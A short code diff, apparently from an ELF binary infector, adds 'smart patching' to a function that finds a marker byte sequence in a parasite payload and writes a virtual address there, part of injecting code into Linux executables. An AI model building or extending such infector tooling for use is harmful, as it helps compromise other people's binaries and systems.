@@ -5,6 +5,23 @@
 
 int patch_parasite64(Elfit_t *parasite, uint32_t patchpos, uint64_t vaddr)
 {
+    int i;
+
+    if (patchpos==0)
+    {
+        printf("[+ USING SMART PATCHING]\n");
+        for (i=0;i<parasite->file->st_size;i++)
+        {
+            if (!strcmp(&parasite->mem[i], "\x77\x66\x55\x44\x33\x22\x11"))
+            {
+                patchpos = i;
+                break;
+            }
+        }
+    }
+
+    printf("[+ PATCHING POSITION %d IN PARASITE]\n", patchpos);
+
     if (patchpos >= parasite->file->st_size)
         return -1;
     *(uint64_t *)&parasite->mem[patchpos] = vaddr;
